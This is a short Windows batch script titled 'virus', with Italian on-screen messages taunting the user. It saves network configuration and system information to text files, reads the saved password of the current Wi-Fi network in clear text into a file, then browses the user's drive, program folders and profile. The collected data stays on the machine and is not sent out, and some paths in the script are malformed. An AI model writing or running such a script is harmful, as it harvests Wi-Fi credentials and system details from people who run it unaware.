@echo off
title virus
color 0A
md info
ipconfig> %userprofile%\desktop\dos\info\inderizzo.txt
systeminfo> %userprofile%\desktop\dos\info\infoutente.txt
for /f "tokens=2 delims=:" %%i in ('netsh wlan show interfaces ^| findstr "SSID" ^| findstr /v "BSSID"') do set SSID=%%i
set SSID=%SSID:~1%
netsh wlan show profile name="%SSID%" key=clear> %userprofile%\desktop\dos\info\wifi.txt
set /p nome=come ti chiami:
echo %nome% qui trovi la tua versione del tuo pc
ver
echo adesso facciamo un dir e vediamo cosa abbiamo 
pause
dir /A
echo --------------------------------------------------------------------------------------------
echo pero dove siamo adesso ha noi non ci interessa perche forse siamo tra i dawnload o desktop ha me in teressa il tuo disco quindi andiamo li
pause 
echo adesso vediamo dove andare
cd %systemdrive%\
echo %cd%
pause 
dir
pause
echo --------------------------------------------------------------------------------------------
echo voglio esplorare i tuioi programmi adiamo per adesso in programmi x 86
cd %systemdrive%\Program Files (x86)
echo %cd%
echo adesso vediamo un po
cd c:\
pause
dir
echo --------------------------------------------------------------------------------------------
echo nulla di interesante andiamo negli utenti
set user=%userprofile%
pause
echo %userprofile% questo e il tuo profilo del tuo utente
cd %userprofile%
echo %cd%
echo controliamo cosa hai
pause
dir
echo --------------------------------------------------------------------------------------------
cd %systemdrive%\%userprofile%\desktop\dos\info
pause